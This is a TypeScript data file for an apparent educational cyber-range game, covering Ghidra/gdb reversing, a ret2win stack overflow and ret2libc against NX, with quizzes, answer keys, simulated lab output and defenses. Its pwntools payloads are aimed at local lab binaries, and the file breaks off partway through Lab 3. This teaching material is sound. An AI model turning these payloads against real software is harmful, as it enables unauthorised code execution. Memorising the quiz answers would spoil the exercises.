import type { EpochConfig, StageConfig } from "./types";

// ── Cyber Range: Binary Exploitation & Reverse Engineering ───────────────────
// Where memory bugs become code execution: reverse engineering with Ghidra/gdb,
// the classic stack buffer overflow (ret2win), modern mitigations (NX/ASLR/canary/
// PIE) and ret2libc, and Return-Oriented Programming — each paired with the
// compiler/OS hardening + memory-safety defense. Faithful simulation of the
// gdb/pwntools/Ghidra workflow. Public sources (AlephOne "Smashing the Stack",
// Shacham ROP, the classic mitigations literature).

export const rangeBinexEpoch: EpochConfig = {
  id: "range-binex",
  name: "Binary Exploitation & RE",
  subtitle: "From a memory bug to a shell — and the mitigations that stop it",
  description:
    "The deepest layer of offense: reverse a binary with Ghidra and gdb, smash the stack to hijack a return address (ret2win), defeat NX with ret2libc, and chain gadgets into a full ROP exploit — each paired with the mitigation (NX, ASLR, stack canaries, PIE, CFI) and the memory-safety lesson that ends the bug class.",
  emoji: "🧬",
  color: "Violet",
  unlocked: true,
};

const bin = (vuln: string) => ({ ip: "10.10.40.10", hostname: "pwn-box", os: "Linux x86-64 (vulnerable C service)", openPorts: "9001 (the target binary, networked)", vulnerability: vuln });

export const rangeBinexStages: StageConfig[] = [
  // ─── Lab 1: reverse engineering with Ghidra + gdb ───────────────────────────
  {
    epochId: "range-binex",
    wonder: { name: "The Disassembly", location: "Authorized Exploit-Dev Lab", era: "Present Day", emoji: "🔬" },
    id: "bin-01",
    order: 1,
    title: "Reverse Engineering with Ghidra & gdb",
    subtitle: "Read the machine to find the secret",
    category: "cybersecurity",
    xp: 175,
    badge: { id: "badge-bin-re", name: "Reverser", emoji: "🔬" },
    challengeType: "ctf",
    info: {
      tagline: "A compiled binary still contains its logic — disassemble and decompile it, and the hidden check or hardcoded secret is right there.",
      year: 2019,
      overview: [
        "Reverse engineering is reading a program you don't have the source for. A compiler turns C into machine code, but it doesn't erase the logic — the comparisons, the constants, the branches are all still there in the instructions. Tools like Ghidra (the NSA's free decompiler, open-sourced in 2019) and IDA disassemble the bytes into assembly and then decompile them back into readable C-like pseudocode, while a dynamic debugger like gdb (with enhancements like GEF/pwndbg) lets you run the binary, set breakpoints, inspect registers and memory, and watch the logic execute. Together they answer the reverser's core questions: what does this do, where is the check I need to pass, and what value satisfies it. This is the foundation of malware analysis, vulnerability research, CTF 'crackmes,' and firmware/IP analysis.",
        "The everyday RE pattern is finding a hidden gate: a license check, a hardcoded password, or a comparison against a secret string. Static analysis (`strings`, Ghidra's decompiler) often reveals constants directly; dynamic analysis (gdb breakpoint on the comparison, read the expected value out of a register) reveals what gets computed at runtime when constants are obfuscated. The same skill underpins offense and defense: attackers reverse software to find bugs and bypass protections; defenders reverse malware to understand it and reverse their own products to see what an attacker would. The defensive takeaways are honest about limits — obfuscation, packing, and anti-debug tricks raise the cost but never make a binary unreadable (anything that runs can be reversed), so never embed secrets, license logic, or crypto keys in client-side binaries expecting them to stay hidden; enforce trust server-side, and use code signing and integrity checks to detect tampering rather than relying on secrecy.",
      ],
      technical: {
        title: "Static + Dynamic Reverse Engineering",
        body: [
          "Static analysis (read it without running):\n- strings ./crackme — pull literal constants (often the password/flag is right there).\n- Ghidra / IDA — disassemble to assembly + decompile to readable C-like pseudocode.\n- Find the check: a strcmp / memcmp / cmp against a secret constant.",
          "Dynamic analysis (run + observe):\n- gdb ./crackme (with GEF/pwndbg) — breakpoint on the comparison, inspect registers/memory.\n- See the EXPECTED value loaded into a register right before the compare.\n- ltrace/strace reveal library/syscall behavior (e.g. the strcmp arguments).",
          "The defenses (raise cost, don't trust secrecy):\n- Anything that runs can be reversed — obfuscation/packing/anti-debug only slow it.\n- NEVER embed secrets, license logic, or keys in a client binary expecting privacy.\n- Enforce trust server-side; code-sign + integrity-check to DETECT tampering.",
        ],
        codeExample: {
          label: "Find the hidden password",
          code: `# Static: the constant is often just sitting in the binary
$ strings ./crackme | grep -i pass
  Enter password:
  S3cr3t_K3y_2024            # <- hardcoded compare value

# Ghidra decompile shows the gate:
#   if (strcmp(input, "S3cr3t_K3y_2024") == 0) { print_flag(); }

# Dynamic confirm: break on the compare, read the expected arg
$ gdb ./crackme
gef> break strcmp
gef> run    -> $rsi = "S3cr3t_K3y_2024"   # the answer, at runtime

# THE FIX: never trust a client binary to keep a secret`,
        },
      },
      incident: {
        title: "Ghidra — Reverse Engineering for Everyone",
        when: "Ghidra open-sourced by the NSA in 2019",
        where: "Malware analysis, vuln research, CTF, firmware review",
        impact: "Made professional-grade decompilation free, accelerating both offense and defense",
        body: [
          "When the NSA open-sourced Ghidra in 2019, it put a professional decompiler in everyone's hands and made reverse engineering — long gatekept by expensive tooling — broadly accessible. The effect cut both ways: vulnerability researchers and malware analysts gained a powerful free decompiler, and so did attackers studying software for bugs and bypasses. It cemented a basic truth of the field: a binary is not a secret. The logic compiled into it can always be recovered.",
          "For defenders the lesson is to stop relying on secrecy. Obfuscation, packing, and anti-debugging raise an attacker's cost and are worth doing, but they never make code unreadable — anything that executes can be analyzed. So secrets, licensing decisions, and cryptographic keys must not live in client-side binaries as if hidden; trust belongs server-side, and code signing plus integrity verification exist to detect tampering, not to keep logic private. Reverse engineering is the lens the rest of this epoch is read through — to exploit a binary, you must first understand it.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Compiled binary", sub: "no source", type: "attacker" },
          { label: "Ghidra / gdb", sub: "disassemble + decompile", type: "system" },
          { label: "Find the check", sub: "hardcoded compare", type: "victim" },
          { label: "Secret recovered", sub: "→ fix: trust server-side", type: "result" },
        ],
      },
      timeline: [
        { year: 2001, event: "IDA Pro era — RE is expert/expensive" },
        { year: 2019, event: "NSA open-sources Ghidra — free decompilation for all", highlight: true },
        { year: 2021, event: "pwndbg/GEF make dynamic RE approachable" },
      ],
      keyTakeaways: [
        "A compiled binary still contains its logic — comparisons, constants, and branches survive compilation",
        "Static analysis (strings, Ghidra/IDA decompiler) often reveals secrets/checks directly",
        "Dynamic analysis (gdb breakpoints, registers/memory) reveals runtime-computed values",
        "Anything that runs can be reversed; obfuscation only raises cost, never guarantees secrecy",
        "Fix: never embed secrets/keys/license logic in client binaries; enforce trust server-side + integrity-check",
      ],
      references: [
        { title: "Ghidra — NSA (open source)", url: "https://ghidra-sre.org/" },
        { title: "pwndbg — gdb plugin for exploit dev/RE", url: "https://github.com/pwndbg/pwndbg" },
      ],
    },
    quiz: {
      questions: [
        { id: "bin-01-q1", type: "Concept", challenge: "What survives.", text: "Why can a binary without source still be understood?", options: ["Its logic (comparisons, constants, branches) survives compilation into machine code", "It ships with comments", "Compilers store the source inside", "It can't be understood"], correctIndex: 0, explanation: "The logic is preserved in the instructions." },
        { id: "bin-01-q2", type: "Tool", challenge: "Decompiler.", text: "What does Ghidra do?", options: ["Disassembles and decompiles a binary into readable pseudocode", "Cracks WPA2", "Scans ports", "Sends email"], correctIndex: 0, explanation: "Ghidra is a disassembler/decompiler." },
        { id: "bin-01-q3", type: "Static", challenge: "Quick win.", text: "What does running `strings` on a binary often reveal?", options: ["Hardcoded constants like passwords or messages", "The kernel version", "Network traffic", "The ASLR base"], correctIndex: 0, explanation: "Literal constants are stored in the binary." },
        { id: "bin-01-q4", type: "Dynamic", challenge: "Runtime.", text: "What does gdb let you do that static analysis doesn't?", options: ["Run the binary and inspect registers/memory at breakpoints", "Decompile faster", "Edit the source", "Recompile it"], correctIndex: 0, explanation: "Dynamic analysis observes runtime state." },
        { id: "bin-01-q5", type: "Pattern", challenge: "The gate.", text: "What is a common RE target in a crackme?", options: ["A comparison (strcmp/cmp) against a secret constant", "The file size", "The icon", "The timestamp"], correctIndex: 0, explanation: "Find and satisfy the check." },
        { id: "bin-01-q6", type: "Truth", challenge: "The limit.", text: "What is the fundamental truth about binaries and secrecy?", options: ["Anything that runs can be reversed — obfuscation only raises cost", "Compiled code is unreadable", "Packing makes it impossible", "Only the NSA can reverse code"], correctIndex: 0, explanation: "Execution implies analyzability." },
        { id: "bin-01-q7", type: "Defense", challenge: "Secrets.", text: "What should you NOT put in a client-side binary?", options: ["Secrets, keys, or license logic expecting them to stay hidden", "A version string", "An icon", "A help message"], correctIndex: 0, explanation: "Client binaries can't keep secrets." },
        { id: "bin-01-q8", type: "Defense", challenge: "What to do.", text: "What's the right defensive posture?", options: ["Enforce trust server-side; use code signing + integrity checks to detect tampering", "Rely on obfuscation alone", "Hide the binary", "Disable gdb on the host"], correctIndex: 0, explanation: "Detect tampering, don't rely on secrecy." },
      ],
    },
    ctf: {
      attackerMachine: { ip: "10.10.40.50", hostname: "kali-pwn", os: "Kali Linux (Ghidra, gdb/pwndbg)" },
      targetMachine: bin("a 'crackme' binary with a hardcoded password gating the flag"),
      scenario: "You're given a 'crackme' binary that asks for a password. Reverse engineer it statically and dynamically to recover the hardcoded secret that unlocks the flag.",
      hint: "Pull strings / decompile to find the compare, then confirm the expected value in gdb.",
      hints: [
        "Read the briefing. Run: cat briefing.txt",
        "Statically reverse the binary. Run: ghidra-decompile",
        "Confirm the expected value at runtime. Run: gdb-break",
        "Run 'assemble' to view the assembled flag and the submit command",
      ],
      fragments: [
        { trigger: "/briefing.txt", value: "FLAG{GHIDR4_", label: "RE Briefing" },
        { trigger: "ghidra-decompile", value: "R3V3RS3D_", label: "Check Located" },
        { trigger: "gdb-break", value: "TH3_K3Y}", label: "Secret Confirmed" },
      ],
      files: {
        "/briefing.txt": [
          "RANGE — BINEX LAB 1: REVERSE ENGINEERING (./crackme wants a password)",
          "Goal: recover the hardcoded secret that prints the flag.",
          "Sequence: ghidra-decompile -> gdb-break -> assemble",
        ].join("\n"),
      },
      dirs: { "/": [{ name: "briefing.txt", isDir: false }, { name: "crackme", isDir: false }] },
      extraCommands: {
        "ghidra-decompile": (_args: string[]) => ({
          lines: [
            "$ strings ./crackme | grep -i pass  ->  'S3cr3t_K3y_2024'",
            "[Ghidra] decompiled main():",
            "  undefined8 main(void) {",
            "    ... fgets(input,64,stdin);",
            "    if (strcmp(input,\"S3cr3t_K3y_2024\") == 0) { print_flag(); }",
            "  }",
            "",
            ">> LEARN: the gate is a strcmp against a constant baked into the binary",
            ">> BLUE TEAM: never trust a client binary to hide a secret. Fragment collected.",
          ],
        }),
        "gdb-break": (_args: string[]) => ({
          lines: [
            "$ gdb ./crackme",
            "gef> break strcmp",
            "gef> run",
            "  Breakpoint: strcmp(",
            "    $rdi = 0x7fffffffe2a0 -> \"hunter2\"            (our input)",
            "    $rsi = 0x555555556008 -> \"S3cr3t_K3y_2024\"   (the EXPECTED value)",
            "  -> feed 'S3cr3t_K3y_2024' -> print_flag() fires",
            "",
            ">> LEARN: even obfuscated constants appear in registers at runtime",
            "   Run 'assemble' to view the flag and the submit command.",
          ],
        }),
      },
    },
  },

  // ─── Lab 2: stack buffer overflow (ret2win) ─────────────────────────────────
  {
    epochId: "range-binex",
    wonder: { name: "The Smashed Stack", location: "Authorized Exploit-Dev Lab", era: "Present Day", emoji: "💥" },
    id: "bin-02",
    order: 2,
    title: "Stack Buffer Overflow: Smashing the Stack",
    subtitle: "Overflow a buffer, overwrite the return address",
    category: "cybersecurity",
    xp: 200,
    badge: { id: "badge-bin-overflow", name: "Stack Smasher", emoji: "💥" },
    challengeType: "ctf",
    info: {
      tagline: "Write past the end of a stack buffer and you overwrite the saved return address — so the function 'returns' to wherever you choose.",
      year: 1996,
      overview: [
        "The stack buffer overflow is the original memory-corruption exploit, immortalized by Aleph One's 1996 Phrack article 'Smashing the Stack for Fun and Profit.' When a C function declares a local buffer (say `char buf[64]`), that buffer lives on the stack, and just past it sits saved data including the function's return address — the location execution jumps back to when the function finishes. If the program copies attacker-controlled input into the buffer without checking the length (the classic culprits: `gets`, `strcpy`, `sprintf`, an unbounded `memcpy`), writing more than 64 bytes runs off the end of the buffer and overwrites that saved return address. Now when the function returns, the CPU jumps to an address the attacker supplied. Control of the return address is control of execution.",
        "The cleanest demonstration is 'ret2win': the binary contains a function that prints the flag (or spawns a shell) but is never legitimately called, and the attacker overflows the buffer to overwrite the return address with that function's address. The exploit workflow is methodical — find the exact offset to the return address (a cyclic 'De Bruijn' pattern in gdb tells you precisely how many bytes), then send `padding + target_address` (built reliably with pwntools). This single bug class drove decades of worms and remote-code-execution CVEs (Morris Worm, Code Red, Slammer). The defenses are the modern mitigations introduced precisely to stop it — and the next labs are about how exploitation adapted to each. The foundational defensive lesson, though, is at the source: bounds checking and memory-safe APIs (`fgets`, `strncpy`, `snprintf`) prevent the overwrite, and memory-safe languages (Rust, Go) eliminate the bug class entirely. The overflow happens because C trusts the programmer to count bytes; safety comes from not having to.",
      ],
      technical: {
        title: "Smashing the Stack (ret2win)",
        body: [
          "Why it works (stack layout):\n- A local buffer sits on the stack; just past it is the saved return address.\n- An unbounded copy (gets/strcpy/sprintf) writes past the buffer end.\n- Overwriting the saved return address => the CPU 'returns' to attacker's choice.",
          "The ret2win workflow:\n- Find the offset: send a cyclic pattern, see which bytes land in RIP/EIP (gdb pattern_offset).\n- Build the payload: padding (offset bytes) + address of the win() function.\n- Deliver with pwntools: p = process('./vuln'); p.sendline(b'A'*72 + p64(win_addr)).",
          "The source-level defenses (the real fix):\n- Bounds-checked APIs: fgets/strncpy/snprintf instead of gets/strcpy/sprintf.\n- Memory-safe languages (Rust, Go) eliminate the bug class.\n- (Mitigations — canary/NX/ASLR/PIE — are the next labs; they raise cost but the bug is the root.)",
        ],
        codeExample: {
          label: "Overflow → overwrite the return address",
          code: `# The bug: no length check
void vuln(){ char buf[64]; gets(buf); }    // <- writes past buf
void win(){ system("/bin/sh"); }           // never called legitimately

# Find the exact offset to the saved return address
gef> pattern create 200 ; run ; pattern offset $rsp   -> 72

# Build + send: 72 bytes of padding, then win()'s address
$ python3 -c 'from pwn import *; p=process("./vuln");
              p.sendline(b"A"*72 + p64(0x401176)); p.interactive()'
  -> returns into win() -> shell

# THE FIX: fgets/strncpy (bounds), or a memory-safe language`,
        },
      },
      incident: {
        title: "Smashing the Stack — The Bug Class That Built Exploitation",
        when: "Aleph One's Phrack article, 1996; the technique predates it",
        where: "Decades of C/C++ software; the engine of worms and RCE CVEs",
        impact: "Arbitrary code execution from a single unchecked copy; drove Morris/Code Red/Slammer",
        body: [
          "Aleph One's 1996 'Smashing the Stack for Fun and Profit' codified the technique that has driven more remote-code-execution vulnerabilities than any other: copy attacker input past the end of a stack buffer, overwrite the saved return address, and seize control of execution. From the 1988 Morris Worm through Code Red and SQL Slammer, the stack overflow was the engine of internet-scale incidents, all rooted in C's willingness to let a program write past the end of an array.",
          "Every mitigation in the following labs — stack canaries, non-executable memory, ASLR, PIE — exists specifically to make this harder, and exploitation evolved to answer each. But the root cause is the unchecked copy, and the durable fix lives at the source: bounds-checked APIs prevent the overwrite, and memory-safe languages remove the possibility entirely, which is why modern systems code is increasingly written in Rust. The overflow is the foundation the rest of binary exploitation builds on — control the return address, control the machine.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Oversized input", sub: "no length check", type: "attacker" },
          { label: "buf[64] on the stack", sub: "saved ret addr just past it", type: "system" },
          { label: "Overwrite return address", sub: "padding + win() addr", type: "victim" },
          { label: "Hijacked execution", sub: "→ fix: bounds / memory-safe lang", type: "result" },
        ],
      },
      timeline: [
        { year: 1988, event: "Morris Worm uses a stack overflow (fingerd)" },
        { year: 1996, event: "Aleph One — 'Smashing the Stack for Fun and Profit'", highlight: true },
        { year: 2003, event: "SQL Slammer — overflow-driven worm saturates the internet" },
      ],
      keyTakeaways: [
        "A stack buffer sits next to the saved return address; an unbounded copy overwrites it",
        "Controlling the saved return address means controlling where the function 'returns' to",
        "ret2win: overflow to overwrite the return address with an address that prints the flag / spawns a shell",
        "Find the exact offset with a cyclic pattern; build the payload (padding + address) with pwntools",
        "Root-cause fix: bounds-checked APIs (fgets/strncpy/snprintf) and memory-safe languages (Rust/Go)",
      ],
      references: [
        { title: "Aleph One — Smashing the Stack for Fun and Profit (Phrack 49)", url: "http://phrack.org/issues/49/14.html" },
        { title: "pwntools — exploit development framework", url: "https://docs.pwntools.com/" },
      ],
    },
    quiz: {
      questions: [
        { id: "bin-02-q1", type: "Concept", challenge: "What's adjacent.", text: "What sits just past a local stack buffer that the attacker wants to overwrite?", options: ["The saved return address", "The heap", "The SSID", "The page table"], correctIndex: 0, explanation: "Overwriting the return address hijacks control flow." },
        { id: "bin-02-q2", type: "Cause", challenge: "The bug.", text: "What enables a stack buffer overflow?", options: ["Copying input into a buffer without checking its length", "A strong password", "ASLR", "A firewall rule"], correctIndex: 0, explanation: "Unbounded copies (gets/strcpy) overflow the buffer." },
        { id: "bin-02-q3", type: "Effect", challenge: "Payoff.", text: "What does controlling the saved return address give you?", options: ["Control over where execution goes when the function returns", "More RAM", "A faster CPU", "Network access only"], correctIndex: 0, explanation: "The CPU jumps to the attacker's address." },
        { id: "bin-02-q4", type: "Technique", challenge: "ret2win.", text: "What is a ret2win exploit?", options: ["Overwriting the return address with the address of a function that prints the flag/spawns a shell", "Cracking a password", "Spoofing DNS", "Sniffing Wi-Fi"], correctIndex: 0, explanation: "Return into an existing 'win' function." },
        { id: "bin-02-q5", type: "Offset", challenge: "Precision.", text: "How do you find the exact offset to the return address?", options: ["Send a cyclic (De Bruijn) pattern and see which bytes land in RIP/EIP", "Guess randomly", "Read the manual", "Use nmap"], correctIndex: 0, explanation: "The cyclic pattern pinpoints the offset." },
        { id: "bin-02-q6", type: "Tool", challenge: "Build it.", text: "What is commonly used to build and deliver the payload?", options: ["pwntools (process/sendline/p64)", "Wireshark", "BloodHound", "Hydra"], correctIndex: 0, explanation: "pwntools is the exploit-dev standard." },
        { id: "bin-02-q7", type: "History", challenge: "Impact.", text: "What did stack overflows historically drive?", options: ["Internet-scale worms and RCE CVEs (Morris, Code Red, Slammer)", "Only local crashes", "Wi-Fi attacks", "Phishing"], correctIndex: 0, explanation: "The bug class drove decades of major incidents." },
        { id: "bin-02-q8", type: "Defense", challenge: "Root fix.", text: "What eliminates the stack-overflow bug class at the source?", options: ["Bounds-checked APIs and memory-safe languages (Rust/Go)", "A longer buffer", "Hiding the binary", "Disabling gdb"], correctIndex: 0, explanation: "Memory safety removes the possibility." },
      ],
    },
    ctf: {
      attackerMachine: { ip: "10.10.40.50", hostname: "kali-pwn", os: "Kali Linux (gdb/pwndbg, pwntools)" },
      targetMachine: bin("vuln() uses gets() into a 64-byte buffer; an unused win() prints the flag"),
      scenario: "The 'vuln' binary reads input with gets() into a 64-byte buffer and contains an unused win() function that prints the flag. Find the offset and overwrite the return address to call win() (ret2win).",
      hint: "Find the exact offset to the return address, then send padding + win()'s address.",
      hints: [
        "Read the briefing. Run: cat briefing.txt",
        "Find the offset to the saved return address. Run: find-offset",
        "Overwrite the return address with win(). Run: ret2win",
        "Run 'assemble' to view the assembled flag and the submit command",
      ],
      fragments: [
        { trigger: "/briefing.txt", value: "FLAG{ST4CK_", label: "Overflow Briefing" },
        { trigger: "find-offset", value: "SM4SH_", label: "Offset Found" },
        { trigger: "ret2win", value: "R3T2W1N}", label: "Return Address Hijacked" },
      ],
      files: {
        "/briefing.txt": [
          "RANGE — BINEX LAB 2: STACK OVERFLOW (./vuln, gets() into buf[64])",
          "Goal: overwrite the saved return address to call win() (ret2win).",
          "Sequence: find-offset -> ret2win -> assemble",
        ].join("\n"),
      },
      dirs: { "/": [{ name: "briefing.txt", isDir: false }, { name: "vuln", isDir: false }] },
      extraCommands: {
        "find-offset": (_args: string[]) => ({
          lines: [
            "gef> pattern create 200",
            "gef> run   (paste pattern)   ->  SIGSEGV",
            "gef> pattern offset $rsp",
            "  [+] offset to saved return address = 72 bytes",
            "  (buf[64] + saved RBP[8] = 72 before RIP)",
            "",
            ">> LEARN: the cyclic pattern pinpoints exactly where RIP is overwritten",
            ">> BLUE TEAM: a stack canary would abort here. Fragment collected.",
          ],
        }),
        "ret2win": (_args: string[]) => ({
          lines: [
            "$ objdump -d vuln | grep win   ->  0000000000401176 <win>",
            "$ python3 -c 'from pwn import *; p=process(\"./vuln\");",
            "    p.sendline(b\"A\"*72 + p64(0x401176)); print(p.recvall())'",
            "  vuln() returns -> jumps into win() -> prints the flag",
            "  >> 'win() reached! here is your flag ...'",
            "",
            ">> LEARN: control of the return address = control of execution",
            ">> BLUE TEAM: bounds-checked input (fgets) or Rust ends this bug class.",
            "   Run 'assemble' to view the flag and the submit command.",
          ],
        }),
      },
    },
  },

  // ─── Lab 3: mitigations + ret2libc ──────────────────────────────────────────
  {
    epochId: "range-binex",
    wonder: { name: "The Mitigations", location: "Authorized Exploit-Dev Lab", era: "Present Day", emoji: "🧱" },
    id: "bin-03",
    order: 3,
    title: "Mitigations & ret2libc: Defeating NX",
    subtitle: "Canary, NX, ASLR, PIE — and how exploits adapted",
    category: "cybersecurity",
    xp: 200,
    badge: { id: "badge-bin-ret2libc", name: "Mitigation Breaker", emoji: "🧱" },
    challengeType: "ctf",
    info: {
      tagline: "Modern binaries fight back with canaries, non-executable stacks, and ASLR — so exploitation stopped injecting code and started reusing the code already there.",
      year: 2001,
      overview: [
        "After 'Smashing the Stack,' defenders added a stack of mitigations, and understanding them is understanding modern exploitation. A stack canary is a random value placed between the buffer and the saved return address; the function checks it before returning, so a linear overflow that overwrites the return address also corrupts the canary and the program aborts (stack-smashing detected). NX/DEP marks the stack non-executable, so even if you write shellcode into the buffer, the CPU refuses to run it. ASLR randomizes the addresses of the stack, heap, and libraries each run, and PIE extends that to the executable itself, so an attacker can't hardcode where anything lives. Stacked together, these turned the trivial 1996 overflow into a real puzzle.",
        "Exploitation adapted rather than died. Since NX stops injected shellcode, attackers stopped injecting code and started reusing code that's already executable — the program's own functions and the C library (libc). The classic technique is ret2libc: overwrite the return address with the address of `system()` and arrange its argument to be the string `\"/bin/sh\"`, so the program calls `system(\"/bin/sh\")` using only legitimate, executable library code — NX never applies because nothing new was injected. Canaries are bypassed by leaking the canary value first (via a separate info-leak bug) and including it in the payload; ASLR/PIE are defeated by leaking a single runtime address and computing the rest relative to it. The defensive point is layered and honest: each mitigation raises the bar and removes whole easy paths, and together they're powerful, but they are defense-in-depth, not a cure — the bug still exists. The durable fix remains memory safety; mitigations buy time and raise cost while the ecosystem migrates to languages where the overflow can't happen.",
      ],
      technical: {
        title: "The Mitigations and ret2libc",
        body: [
          "The modern mitigations (checksec shows them):\n- Stack canary — random value before the return addr; checked on return (overflow => abort).\n- NX/DEP — stack/heap non-executable; injected shellcode won't run.\n- ASLR — randomizes stack/heap/libc addresses each run.\n- PIE — randomizes the executable's own base too.",
          "How exploitation adapts:\n- NX => don't inject code; REUSE executable code (the binary + libc).\n- ret2libc: set return addr = system(), arrange arg = \"/bin/sh\" => system(\"/bin/sh\").\n- Canary => leak it first (info-leak bug), include it in the payload so the check passes.\n- ASLR/PIE => leak one runtime address, compute everything else as an offset from it.",
          "The defensive reality (defense-in-depth, not a cure):\n- Each mitigation removes easy paths and raises cost; together they're strong.\n- They do NOT remove the bug — a leak + reuse can still chain past them.\n- Durable fix = memory-safe languages; keep ALL mitigations on (full RELRO, canaries, PIE, NX).",
        ],
        codeExample: {
          label: "NX is on → reuse libc instead of injecting",
          code: `$ checksec ./vuln
  Canary: No   NX: Yes   PIE: No        # NX on -> can't run injected shellcode

# ret2libc: return into system("/bin/sh") using code already in libc
from pwn import *
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
system  = libc.sym["system"]
binsh   = next(libc.search(b"/bin/sh"))
payload = b"A"*72 + p64(POP_RDI) + p64(binsh) + p64(system)  # arg then call
p.sendline(payload)   # -> system("/bin/sh"), NX never applies

# THE FIX: keep canary+PIE+full RELRO on; memory-safe languages end it`,
        },
      },
      incident: {
        title: "The Mitigation Arms Race",
        when: "StackGuard 1998 · NX/DEP 2004 · ASLR mid-2000s · PIE shortly after",
        where: "Every modern OS and compiler toolchain",
        impact: "Turned trivial overflows into multi-step exploits requiring info leaks and code reuse",
        body: [
          "The history of exploit mitigation is an arms race: StackGuard introduced canaries in 1998, hardware NX/DEP arrived around 2004, and ASLR plus position-independent executables followed, each closing an easy door. Together they transformed the trivial 1996 stack smash into a multi-stage problem requiring an information leak and code reuse. The attacker's answer was ret2libc and, beyond it, return-oriented programming — repurposing the executable code already present instead of injecting new code that NX would block.",
          "The honest defensive takeaway is that mitigations are defense-in-depth, not elimination. Canaries, NX, ASLR, and PIE each remove whole classes of easy exploit and dramatically raise cost, and you should enable all of them (along with full RELRO and modern compiler hardening) — but a sufficiently capable attacker with an info-leak primitive can still chain past them, which is the next lab's subject. The bug itself is the root cause, and only memory-safe languages remove it; mitigations are what keep the existing C/C++ world defensible while that migration happens.",
        ],
      },
      diagram: {
        nodes: [
          { label: "NX / canary / ASLR / PIE", sub: "modern mitigations", type: "system" },
          { label: "Can't inject shellcode", sub: "NX blocks it", type: "attacker" },
          { label: "ret2libc (reuse code)", sub: "system(\"/bin/sh\")", type: "victim" },
          { label: "Shell despite NX", sub: "→ fix: all mitigations + memory safety", type: "result" },
        ],
      },
      timeline: [
        { year: 1998, event: "StackGuard — stack canaries" },
        { year: 2004, event: "NX/DEP — non-executable memory", highlight: true },
        { year: 2005, event: "ASLR + PIE — address randomization" },
      ],
      keyTakeaways: [
        "Stack canaries detect a linear overflow before return; NX blocks injected shellcode; ASLR/PIE randomize addresses",
        "Since NX stops injection, exploitation REUSES existing executable code (the binary + libc)",
        "ret2libc returns into system() with the argument '/bin/sh' — all legitimate library code, so NX doesn't apply",
        "Canaries are bypassed by leaking them; ASLR/PIE by leaking one address and computing offsets",
        "Mitigations are defense-in-depth, not a cure — keep them ALL on; memory-safe languages are the durable fix",
      ],
      references: [
        { title: "checksec — binary mitigation inspection", url: "https://github.com/slimm609/checksec.sh" },
        { title: "Return-to-libc (concept)", url: "https://en.wikipedia.org/wiki/Return-to-libc_attack" },
      ],
    },
    quiz: {
      questions: [
        { id: "bin-03-q1", type: "Mitigation", challenge: "Canary.", text: "What does a stack canary do?", options: ["Places a random value before the return address; a linear overflow corrupts it and aborts", "Encrypts the stack", "Randomizes addresses", "Blocks code execution"], correctIndex: 0, explanation: "The canary check detects the overflow." },
        { id: "bin-03-q2", type: "Mitigation", challenge: "NX.", text: "What does NX/DEP prevent?", options: ["Executing injected shellcode from the (non-executable) stack/heap", "Reading memory", "Network access", "Password reuse"], correctIndex: 0, explanation: "NX marks data memory non-executable." },
        { id: "bin-03-q3", type: "Mitigation", challenge: "ASLR/PIE.", text: "What do ASLR and PIE accomplish?", options: ["Randomize where the stack/heap/libc/executable load each run", "Encrypt the binary", "Add a canary", "Disable gdb"], correctIndex: 0, explanation: "Randomized addresses break hardcoded targets." },
        { id: "bin-03-q4", type: "Adapt", challenge: "Answer to NX.", text: "How did exploitation adapt to NX?", options: ["Reuse existing executable code instead of injecting new code", "Use longer shellcode", "Crack passwords", "Give up"], correctIndex: 0, explanation: "Code reuse sidesteps NX entirely." },
        { id: "bin-03-q5", type: "Technique", challenge: "ret2libc.", text: "What is a ret2libc attack?", options: ["Return into system() with arg '/bin/sh' using libc code already present", "Inject shellcode", "Spoof ARP", "Crack WPA2"], correctIndex: 0, explanation: "It calls a real libc function — NX doesn't apply." },
        { id: "bin-03-q6", type: "Bypass", challenge: "Beat the canary.", text: "How is a stack canary typically bypassed?", options: ["Leak its value first and include it in the payload", "Guess all 2^64 values", "Disable the CPU", "Reboot"], correctIndex: 0, explanation: "An info leak reveals the canary." },
        { id: "bin-03-q7", type: "Bypass", challenge: "Beat ASLR.", text: "How is ASLR/PIE defeated in practice?", options: ["Leak one runtime address and compute the rest as offsets", "Try every address slowly", "Turn off the firewall", "Use a bigger buffer"], correctIndex: 0, explanation: "One leak deranomizes the layout." },
        { id: "bin-03-q8", type: "Defense", challenge: "Honest truth.", text: "What's the honest framing of mitigations?", options: ["Defense-in-depth that raises cost — not a cure; memory safety is the durable fix", "They eliminate all bugs", "They're useless", "They replace patching"], correctIndex: 0, explanation: "Mitigations buy time; safety removes the bug." },
      ],
    },
    ctf: {
      attackerMachine: { ip: "10.10.40.50", hostname: "kali-pwn", os: "Kali Linux (pwntools, checksec)" },
      targetMachine: bin("NX enabled (no injected shellcode), no canary, no PIE — ret2libc reachable"),
      scenario: "This binary has NX enabled, so injected shellcode won't run — but there's no canary and no PIE. Defeat NX by returning into libc: call system(\"/bin/sh\") using code already in the process.",
      hint: "checksec to confirm NX, then build a ret2libc chain: arg '/bin/sh' into system().",
      hints: [
        "Read the briefing. Run: cat briefing.txt",
        "Check the mitigations. Run: checksec",
        "Build the ret2libc chain to defeat NX. Run: ret2libc",
        "Run 'assemble' to view the assembled flag and the submit command",
      ],
      fragments: [
        { trigger: "/briefing.txt", value: "FLAG{R3T2L1BC_", label: "Mitigation Briefing" },
        { trigger: "checksec", value: "BYP4SS3D_", label: "Mitigations Mapped" },
        { trigger: "ret2libc", value: "NX}", label: "NX Defeated" },
      ],
      files: {
        "/briefing.txt": [
          "RANGE — BINEX LAB 3: MITIGATIONS / ret2libc (NX on, no canary/PIE)",
          "Goal: defeat NX by reusing libc -> system('/bin/sh').",
          "Sequence: checksec -> ret2libc -> assemble",
        ].join("\n"),
      },
      dirs: { "/": [{ name: "briefing.txt", isDir: false }, { name: "vuln", isDir: false }] },
      extraCommands: {
        "checksec": (_args: string[]) => ({
          lines: [
            "$ checksec ./vuln",
            "  RELRO: Partial   Canary: No   NX: Yes   PIE: No",
            "  -> NX on: injected stack shellcode WON'T execute",
            "  -> no canary + no PIE: linear overflow works, addresses are fixed",
            "",
            ">> LEARN: NX forces code REUSE instead of code injection",
            ">> BLUE TEAM: turn on the canary + PIE + full RELRO. Fragment collected.",
          ],
        }),
        "ret2libc": (_args: string[]) => ({
          lines: [
            "from pwn import *",
            "  libc   = ELF('/lib/x86_64-linux-gnu/libc.so.6')",
